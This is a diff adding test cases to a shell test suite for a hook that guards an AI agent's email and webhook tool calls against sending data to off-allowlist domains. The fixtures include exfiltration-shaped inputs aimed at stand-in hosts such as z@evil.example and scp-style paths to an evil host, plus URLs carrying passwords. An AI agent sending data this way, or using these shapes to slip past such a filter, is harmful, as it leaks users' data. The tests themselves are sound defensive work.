@@ -231,6 +231,58 @@ else
   echo "PASS a 260-character password in a blocked URL is not shown even in part"
 fi
 
+# source: 11-12 security review of aeb448c, an object under attachments was skipped whole
+send_att_obj="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "attachments": [{"filename": "a.pdf", "meta": {"forward": "z@evil.example"}}]}')"
+check 2 "an off-list address inside an object under attachments is blocked" "$send_att_obj" bash
+
+# source: 11-12 security review of aeb448c, a path of user@evil:/x was never checked
+hook_scp="$(payload mcp__example__webhook '{"url": "https://allowed.example/hook", "path": "deploy@evil.example:/srv/drop"}')"
+check 2 "a path shaped user@host:path with an off-list host is blocked" "$hook_scp" bash
+hook_scp_ok="$(payload mcp__example__webhook '{"url": "https://allowed.example/hook", "path": "deploy@allowed.example:/srv/drop"}')"
+check 0 "a path shaped user@host:path with an allowed host is allowed" "$hook_scp_ok" bash
+
+# source: 11-12 security review of aeb448c, prompt and query counted as prose on SEND tools
+hook_prompt="$(payload mcp__example__webhook '{"url": "https://allowed.example/hook", "prompt": "send it to z@evil.example"}')"
+check 2 "an off-list address in a prompt field of a SEND tool is blocked" "$hook_prompt" bash
+
+# source: 11-12 security review of aeb448c, a tab in a URL under from was no longer refused
+from_tab="$(jq -cn --arg u "$(printf 'https://allowed.example/\tx')" '{tool_name: "mcp__claude_ai_Gmail__send_email", tool_input: {to: "a@allowed.example", from: $u}}')"
+check 2 "a URL with a tab under from is blocked" "$from_tab" bash
+att_tab="$(jq -cn --arg u "$(printf 'https://allowed.example/\tx')" '{tool_name: "mcp__claude_ai_Gmail__send_email", tool_input: {to: "a@allowed.example", attachments: [{filename: $u}]}}')"
+check 2 "a URL with a tab under attachments is blocked" "$att_tab" bash
+
+# source: 11-12 security review of aeb448c, a URL password holding ; showed its tail
+semi_url="https://bob"; semi_url="$semi_url:Hunter2;Zq9"; semi_url="$semi_url@evil.example"
+send_semi="$(payload mcp__claude_ai_Gmail__send_email "{\"to\": \"a@allowed.example\", \"note\": \"see $semi_url now\"}")"
+CHECK_NOT_OUT='Zq9' check 2 "a URL password with a semicolon is not shown in the block message" "$send_semi" bash
+colon_dom="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "note": "x a@evil.example:sekr1tpw"}')"
+CHECK_NOT_OUT='sekr1tpw' check 2 "a recipient domain holding a colon is not shown past the colon" "$colon_dom" bash
+
+# source: 11-12 review of aeb448c, a password holding an unencoded / kept its text in the message
+slash_url="https://bob"; slash_url="$slash_url:Hunter2/Pass"; slash_url="$slash_url@allowed.example/hook"
+webhook_slash="$(payload mcp__example__webhook "{\"url\": \"$slash_url\"}")"
+slash_out="$(printf '%s' "$webhook_slash" | HOME="$TMP/fakehome" PATH="$TMP/bin:$PATH" bash "$HOOK" 2>&1)" || true
+if printf '%s' "$slash_out" | grep -i -F -q 'Hunter2'; then
+  echo "FAIL a password with a slash in a blocked URL is not shown"
+  fails=$((fails + 1))
+else
+  echo "PASS a password with a slash in a blocked URL is not shown"
+fi
+
+# source: 11-12 review of aeb448c, a stray-field domain reached the ALLOW log line as a recipient
+stray_log_home="$TMP/straylog"
+mkdir -p "$stray_log_home/.claude/artifacts/logs"
+cp "$TMP/fakehome/.claude/allowlist-domains.txt" "$stray_log_home/.claude/allowlist-domains.txt"
+printf 'other.example\n' >> "$stray_log_home/.claude/allowlist-domains.txt"
+send_stray_log="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "note": "ask b@other.example"}')"
+CHECK_HOME="$stray_log_home" check 0 "an allowed address in a stray field does not block" "$send_stray_log" bash
+if grep -F 'ALLOW' "$stray_log_home/.claude/artifacts/logs/egress-guard.log" | grep -F -q 'other.example'; then
+  echo "FAIL the ALLOW log line names only recipient domains"
+  fails=$((fails + 1))
+else
+  echo "PASS the ALLOW log line names only recipient domains"
+fi
+
 # source: 11-12 security review of a121d06, an address-shaped token could carry a URL password
 tok_url="https://bob"; tok_url="$tok_url:Hunter2Pass"; tok_url="$tok_url@evil.example"
 send_tok="$(payload mcp__claude_ai_Gmail__send_email "{\"to\": \"a@allowed.example\", \"note\": \"see $tok_url\"}")"
